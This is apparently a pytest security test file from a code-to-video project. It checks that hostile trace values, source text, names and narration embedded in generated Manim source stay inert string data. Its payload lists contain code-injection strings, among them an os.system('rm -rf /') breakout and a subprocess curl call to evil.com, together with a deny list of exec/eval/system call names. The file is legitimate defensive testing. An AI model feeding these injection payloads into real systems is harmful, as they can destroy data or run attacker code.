"""Security tests for the Phase 4.2 primitives.

The engine now embeds far more trace-derived data into generated Manim
source (array cells, variable names and values, source code). Every one of
those is a new place a hostile value could try to become executable
syntax. These tests prove it cannot: all data goes through repr(), and the
generated source stays syntactically valid Python whose behaviour does not
change.
"""

from __future__ import annotations

import ast

import pytest

from code2shorts.ai.contracts import (
    VisualAction,
    VisualizationPlanResponse,
    VisualizationStepPlan,
)
from code2shorts.core.models import (
    ExecutionTrace,
    SupportedLanguage,
    TraceEvent,
    TraceEventType,
)
from code2shorts.visualization.manim_renderer import build_scene_source
from code2shorts.visualization.renderer import RenderContext
from code2shorts.visualization.state import reconstruct_frames

# Values crafted to break out of a string literal and execute.
HOSTILE_VALUES = [
    "'); import os; os.system('rm -rf /'); ('",
    '"); __import__("subprocess").run(["curl","evil.com"]); ("',
    "\\'); exec('print(1)'); ('",
    "''' + __import__('os').getcwd() + '''",
    "\n        import os\n        os.system('whoami')\n",
    "{__import__('os').system('id')}",
    "%s%s%s",
    "\x00\x01binary",
]


def _trace_with(cell_value: str, scalar_value: str, var_name: str) -> ExecutionTrace:
    events = [
        TraceEvent(
            step_index=0,
            event_type=TraceEventType.VARIABLE_ASSIGN.value,
            description="init",
            variable_name="arr",
            new_value="[1, 2]",
        ),
        TraceEvent(
            step_index=1,
            event_type=TraceEventType.ARRAY_WRITE.value,
            description="write",
            variable_name="arr[0]",
            new_value=cell_value,
        ),
        TraceEvent(
            step_index=2,
            event_type=TraceEventType.VARIABLE_ASSIGN.value,
            description="scalar",
            variable_name=var_name,
            new_value=scalar_value,
        ),
    ]
    return ExecutionTrace(
        algorithm_name="t",
        language=SupportedLanguage.JAVA,
        input="",
        output="",
        succeeded=True,
        exit_code=0,
        events=events,
    )


def _plan() -> VisualizationPlanResponse:
    return VisualizationPlanResponse(
        lesson_title="t",
        steps=[
            VisualizationStepPlan(
                order=0,
                visual_action=VisualAction.ARRAY_ACCESS,
                trace_event_index=1,
                narration_text="step",
                duration_seconds=1.0,
            )
        ],
    )


@pytest.mark.parametrize("hostile", HOSTILE_VALUES)
def test_hostile_array_cell_values_cannot_become_code(hostile: str) -> None:
    context = RenderContext(trace=_trace_with(hostile, "0", "i"))
    source = build_scene_source(_plan(), "S", context)
    tree = ast.parse(source)  # must remain valid Python
    _assert_no_dangerous_calls(tree)


@pytest.mark.parametrize("hostile", HOSTILE_VALUES)
def test_hostile_scalar_values_cannot_become_code(hostile: str) -> None:
    context = RenderContext(trace=_trace_with("1", hostile, "i"))
    source = build_scene_source(_plan(), "S", context)
    _assert_no_dangerous_calls(ast.parse(source))


@pytest.mark.parametrize("hostile", HOSTILE_VALUES)
def test_hostile_variable_names_cannot_become_code(hostile: str) -> None:
    context = RenderContext(trace=_trace_with("1", "0", hostile))
    source = build_scene_source(_plan(), "S", context)
    _assert_no_dangerous_calls(ast.parse(source))


@pytest.mark.parametrize("hostile", HOSTILE_VALUES)
def test_hostile_source_code_panel_cannot_become_code(hostile: str) -> None:
    context = RenderContext(trace=_trace_with("1", "0", "i"), source_code=hostile)
    source = build_scene_source(_plan(), "S", context)
    _assert_no_dangerous_calls(ast.parse(source))


@pytest.mark.parametrize("hostile", HOSTILE_VALUES)
def test_hostile_narration_and_title_cannot_become_code(hostile: str) -> None:
    plan = VisualizationPlanResponse(
        lesson_title=hostile,
        steps=[
            VisualizationStepPlan(
                order=0,
                visual_action=VisualAction.INTRO,
                trace_event_index=1,
                narration_text=hostile,
                duration_seconds=1.0,
            )
        ],
    )
    source = build_scene_source(plan, "S", RenderContext(trace=_trace_with("1", "0", "i")))
    _assert_no_dangerous_calls(ast.parse(source))


def _assert_no_dangerous_calls(tree: ast.AST) -> None:
    """No import/exec/eval/system call may appear anywhere in the AST
    except the single top-level `from manim import *` we emit ourselves."""
    banned_names = {"exec", "eval", "compile", "__import__", "open", "system", "popen", "run"}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            raise AssertionError(f"unexpected import: {ast.dump(node)}")
        if isinstance(node, ast.ImportFrom) and node.module != "manim":
            raise AssertionError(f"unexpected import from {node.module}")
        if isinstance(node, ast.Call):
            func = node.func
            name = getattr(func, "id", None) or getattr(func, "attr", None)
            if name in banned_names:
                raise AssertionError(f"dangerous call emitted: {name}")


def test_hostile_data_survives_as_inert_string_literals() -> None:
    """Positive control: the hostile text IS present in the output — as
    data inside a string literal, which is exactly the intended outcome
    (it will simply be drawn on screen)."""
    hostile = "'); import os; ('"
    context = RenderContext(trace=_trace_with(hostile, "0", "i"))
    source = build_scene_source(_plan(), "S", context)

    tree = ast.parse(source)
    literals = {
        node.value for node in ast.walk(tree) if isinstance(node, ast.Constant) and isinstance(node.value, str)
    }
    assert any(hostile in literal for literal in literals), "hostile text should survive as data"
    _assert_no_dangerous_calls(tree)


def test_generated_source_is_always_valid_python_for_all_algorithms() -> None:
    """Structural: whatever the trace contains, the emitted scene compiles."""
    for cell, scalar, name in [("", "", ""), ("π≈3", "−1", "变量"), ("a" * 500, "9" * 50, "x" * 200)]:
        context = RenderContext(trace=_trace_with(cell, scalar, name or "v"))
        source = build_scene_source(_plan(), "S", context)
        compile(source, "<scene>", "exec")


# ---- Phase 4.3: code-window channel ---------------------------------------


def test_hostile_source_survives_windowing_as_inert_data() -> None:
    """The code window embeds REAL source text into generated Manim source.
    Hostile source must stay data, and the window must not alter it."""
    from code2shorts.core.models import SourceLocation
    from code2shorts.visualization.code_state import build_code_state
    from code2shorts.visualization.primitives import code_panel

    for payload in HOSTILE_VALUES:
        sources = {"X.java": "\n".join([f"// pad {i}" for i in range(10)] + [payload])}
        state = build_code_state(SourceLocation(file="X.java", line=11), sources)
        generated = "\n".join(code_panel(state))
        # wrap so the emitted fragment is parseable on its own
        tree = ast.parse("\n".join(l for l in generated.splitlines()))
        _assert_no_dangerous_calls(tree)


@pytest.mark.parametrize(
    "payload",
    [
        "public class Evil { }\"); import os; os.system(\"id\"); Code(\"",
        "'''); __import__('subprocess').run(['id']); Code(code_string='''",
        "line with \x00 null",
        "😀 unicode class name",
        "line\nwith\nnewlines",
    ],
)
def test_hostile_class_and_method_names_stay_inert(payload: str) -> None:
    """Class/method names reach the renderer via SourceLocation."""
    from code2shorts.core.models import SourceLocation
    from code2shorts.visualization.code_state import build_code_state
    from code2shorts.visualization.primitives import code_panel

    sources = {"X.java": f"class A {{ void m() {{ {payload} }} }}"}
    state = build_code_state(
        SourceLocation(file="X.java", line=1, method=payload, class_name=payload), sources
    )
    tree = ast.parse("\n".join(code_panel(state)))
    _assert_no_dangerous_calls(tree)
